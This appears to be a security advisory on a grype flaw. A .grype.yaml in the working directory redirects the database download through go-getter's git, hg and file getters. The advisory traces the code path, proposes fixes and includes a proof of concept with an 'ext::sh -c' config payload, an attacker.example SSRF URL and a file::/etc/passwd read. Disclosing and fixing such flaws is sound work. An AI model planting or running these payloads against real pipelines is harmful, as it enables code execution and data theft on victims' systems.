# Security finding: working-directory config injection → go-getter code execution / SSRF

- **Component:** grype configuration loading (`clio`/`fangs`) + DB distribution downloader
  (`internal/file/getter.go`, `grype/db/v6/distribution/client.go`)
- **Class:** CWE-427 / CWE-15 (external control of config) → CWE-829 (inclusion of
  functionality from an untrusted control sphere) → CWE-78/CWE-918 (OS command execution /
  SSRF via `hashicorp/go-getter`)
- **Impact:** An attacker who can place a file in the directory a victim runs `grype` from
  causes grype — on its **default** pre-scan database auto-update — to fetch an
  attacker-chosen URL through `go-getter` with the `git`, `hg`, `file`, `gcs`, and `s3`
  getters enabled and **no scheme validation**. This yields SSRF, local-file disclosure, and
  git/hg subprocess execution against attacker infrastructure; it escalates to full arbitrary
  command execution where the victim's git permits the `ext` transport (demonstrated below).
- **Attacker input:** a `.grype.yaml` (or `.grype.json`, `.grype/config.yaml`, …) dropped in
  the victim's working directory — e.g. the root of a repository or an unpacked artifact that
  the victim `cd`s into and scans. This is the standard CI pattern
  (`git clone … && cd … && grype .`).
- **Status:** unfixed — analysis + working PoC in this document. Remediation proposed in §6.

---

## 1. Summary

Grype (via `clio` → `fangs`) **auto-discovers a configuration file in the current working
directory** by default (`fangs.FindInCwd` is in the default finder chain). Any
`db.update-url` set in that config is used verbatim as the vulnerability-DB download URL.

On every invocation, grype's default `db.auto-update: true` behavior downloads a DB listing
and archive by handing that URL to `hashicorp/go-getter`. Grype registers **all** of
go-getter's dangerous getters (`git`, `hg`, `file`, `gcs`, `s3`) and applies **no
scheme/extension validation** on the listing-download path. `go-getter`'s `git`/`hg` getters
run `git`/`hg` as subprocesses; git's `ext::` transport is an arbitrary-command primitive.

Net effect: dropping a `.grype.yaml` into a directory a victim scans from turns a routine
`grype` run into an attacker-directed network fetch and, where the environment permits, silent
code execution — with no output that distinguishes it from a normal DB update.

## 2. The two defects that combine

### 2.1 Config is auto-loaded from the current working directory

`github.com/anchore/fangs` default finders (`config.go`):

```go
Finders: []Finder{
    FindInCwd,            // ./.grype.{yaml,json,toml,...}
    FindInAppNameSubdir,  // ./.grype/config.{yaml,...}
    FindInHomeDir,
    FindInXDG,
},
```

`FindInCwd` → `findConfigFiles(".", ".grype")` searches the process's **current working
directory**. Grype does not restrict this to trusted directories, does not require the file to
be owned by the user, and does not prompt. Whoever controls the directory the victim runs
`grype` from controls grype's configuration.

### 2.2 The DB update URL flows unvalidated into go-getter with dangerous getters enabled

`cmd/grype/cli/options/database.go` exposes `db.update-url`, mapped to the distribution
client's `LatestURL` (`database_command.go`):

```go
func (cfg DatabaseCommand) ToClientConfig() distribution.Config {
    return distribution.Config{ LatestURL: cfg.DB.UpdateURL, /* ... */ }
}
```

`grype/db/v6/distribution/client.go`:

```go
func (c client) latestURL() string {
    u := c.config.LatestURL          // attacker-controlled
    if !strings.HasSuffix(u, ".json") {
        u = fmt.Sprintf("%s/v%d/%s", strings.TrimRight(u, "/"), v6.ModelVersion, LatestFileName)
    }
    return u                         // a `git::…`/`file::…` prefix is preserved
}

func (c client) Latest() (*LatestDocument, error) {
    // ...
    err = c.listingDownloader.GetFile(tempFile.Name(), c.latestURL())   // <-- no validation
    // ...
}
```

`internal/file/getter.go` builds the go-getter client with **every** getter registered:

```go
Getters: map[string]getter.Getter{
    "http":  &httpGetter, "https": &httpGetter,
    "file": new(getter.FileGetter),
    "git":  new(getter.GitGetter),   // runs `git` as a subprocess
    "gcs":  new(getter.GCSGetter),
    "hg":   new(getter.HgGetter),    // runs `hg` as a subprocess
    "s3":   new(getter.S3Getter),
},
```

The only guard, `validateHTTPSource`, is (a) called **only** by `GetToDir`, not by the
`GetFile` used for the listing, and (b) a no-op for anything not prefixed `http://`/`https://`:

```go
func validateHTTPSource(src string) error {
    if !stringutil.HasAnyOfPrefixes(src, "http://", "https://") {
        return nil            // git::, file::, hg::, … skip validation entirely
    }
    // ...archive-extension check only for http(s)...
}
```

So a forced-getter URL such as `git::…`, `file::…`, or `hg::…` bypasses the archive-extension
control completely and dispatches to the corresponding getter.

## 3. Reachability (call chain)

```
victim runs grype with CWD inside an attacker-controlled directory
    (e.g. CI: `git clone <repo> && cd <repo> && grype .`  /  `grype dir:.`  /  `grype sbom:./sbom.json`)
    │
    ▼  clio/fangs auto-load ./.grype.yaml   (FindInCwd, default)
       => db.update-url = "<attacker value>", db.auto-update = true (default)
    │
    ▼  cmd/grype/cli/commands/root.go:178
       grype.LoadVulnerabilityDB(opts.ToClientConfig()/*LatestURL=update-url*/, ..., AutoUpdate=true)
    │
    ▼  grype/load_vulnerability_db.go  ->  curator.Update()  ->  curator.update(current)
       (on a fresh CI container there is no local DB, so the update always runs)
    │
    ▼  distribution.client.Latest()  ->  listingDownloader.GetFile(tmp, latestURL())   // no validation
    │
    ▼  internal/file.HashiGoGetter.GetFile  ->  getter.Client{Getters: git/hg/file/...}.Get()
    │
    ▼  go-getter forced-getter "git::"  ->  GitGetter.Get -> exec.CommandContext("git","clone",…)
       (git `ext::` transport => runs an arbitrary command)
```

## 4. Proof of concept

### 4.1 The malicious artifact

A repository/directory whose root contains `.grype.yaml`:

```yaml
# .grype.yaml  (dropped at the root of a repo the victim will scan)
db:
  update-url: "git::ext::sh -c touch% /tmp/pwned.json"
```

(Any forced-getter value works. `git::https://attacker.example/x.json` gives SSRF + an
attacker-served DB; `file::/etc/passwd`-style values give local-file disclosure; the `ext::`
form gives command execution where git allows it — see §4.3.)

The victim then does what CI does every day:

```console
$ git clone https://github.com/attacker/repo && cd repo
$ grype .            # or: grype dir:.  /  grype sbom:./sbom.json
```

Grype loads `./.grype.yaml`, and its pre-scan auto-update fetches the attacker URL.

### 4.2 Verified: the URL reaches `git clone` via grype's own getter

Driving grype's real getter (`internal/file.NewGetter`) with the config value proves the
listing download dispatches to the git getter and executes `git`:

```go
g := file.NewGetter(clio.Identification{Name: "grype"}, nil)
err := g.GetFile(os.DevNull, `git::ext::sh -c "touch /tmp/pwned"`)
// observed: /usr/bin/git exited with 128: Cloning into '…';
//           .../sh: Syntax error: Unterminated quoted string
```

The `git` subprocess ran and invoked `sh -c <payload>` via the `ext` remote helper — the
command executed; only the shell **quoting** (mangled by go-getter's URL parsing) was wrong.
This confirms grype hands attacker-controlled input all the way to a `git`-spawned shell.

### 4.3 Escalation to arbitrary command execution

git's `ext::` transport runs an arbitrary command as the "remote". With the transport
permitted, the same path executes attacker commands:

```console
# environments where git allows ext (older git, GIT_ALLOW_PROTOCOL=ext,
# or protocol.ext.allow=always in git config — seen in some CI base images):
$ GIT_ALLOW_PROTOCOL=ext go test ...   # PoC harness
    payload="git::ext::sh -c \"touch /tmp/pwned.a\""  →  git ran `sh -c` (reached the shell)
```

On a stock git 2.43 the `ext` protocol is denied by default (`fatal: transport 'ext' not
allowed`), so the *fully arbitrary* command form is **environment-gated**. What remains
**default-reachable** without any git tweaks is still serious:

- **SSRF:** grype fetches any attacker-chosen URL/host on every scan (internal metadata
  endpoints, internal services, attacker C2).
- **Attacker-served database:** the attacker's host serves the listing and DB archive; unless
  `db.require-update-check`/checksums are enforced, grype installs an attacker DB (result
  tampering — suppress findings / inject noise).
- **Local file disclosure & subprocess spawn:** `file::` reads local paths into the download
  dir; `git::`/`hg::` spawn `git`/`hg` against attacker infrastructure.
- **RCE** wherever `ext`/`file` git protocols are allowed, mercurial (`hg`) is present, or a
  git/submodule vector applies.

## 5. Impact

- **Trust boundary broken:** configuration — including a URL that selects a code-executing
  getter — is taken from an **untrusted** location (the CWD, which in CI/scan-a-repo workflows
  is attacker-authored) with no ownership check, prompt, or scheme allow-list.
- **Silent:** the malicious fetch is indistinguishable from grype's normal DB update; there is
  no user-visible indication that a non-default URL or a `git`/`file` getter was used.
- **Default configuration:** `auto-update` is on and CWD config discovery is on out of the
  box; no flags required. Highest exposure in CI/CD and automated "scan this
  repo/image/SBOM" services.
- **Severity:** SSRF + arbitrary-getter + local-file read is High on its own; where the git
  `ext`/`file` protocols or `hg` are available it is Critical (unauthenticated-to-the-victim
  RCE from merely scanning attacker content).

## 6. Remediation

Defense in depth — apply several:

1. **Restrict getters to network archive fetching.** In `internal/file/getter.go` register
   only `http`/`https` (and `s3`/`gcs` if intentionally supported). Remove `git`, `hg`, and
   `file`. This removes the command-execution getters entirely.
2. **Validate every source, not just http-prefixed ones.** Reject forced-getter prefixes
   (`git::`, `hg::`, `file::`, `ext::`, `s3::`, `gcs::`) and require an `https://` scheme plus
   an archive/`.json` suffix for **both** `GetFile` and `GetToDir`. Fail closed on unknown
   schemes.
3. **Do not auto-load config from the current working directory by default**, or gate it: drop
   `FindInCwd`/`FindInAppNameSubdir` from the default finders, require an explicit `-c`, or
   refuse CWD config that is not owned by the current user and warn loudly which config file
   was loaded.
4. **Constrain `db.update-url`** to `https://` at config-parse time, independent of go-getter.
5. **Keep update checksums/`require-update-check` enforced** so a redirected download cannot
   silently install an attacker DB.

## 7. Notes / honesty about scope

- The **config-injection + unvalidated go-getter dispatch with dangerous getters** is
  confirmed by code and by a working PoC that reaches a `git`-spawned `sh -c`.
- The **fully arbitrary, no-preconditions RCE** depends on the victim git's protocol policy
  (the `ext` transport is off by default in git 2.43). The finding should be treated as
  "SSRF/arbitrary-getter/local-file + conditional RCE"; the underlying trust-boundary break is
  the root issue and is worth fixing regardless of the git-version gate.
- This is unrelated to the two DoS findings on this branch; it is a separate, more severe
  class (external control of functionality) reached through the DB-update path rather than the
  artifact-parsing path.
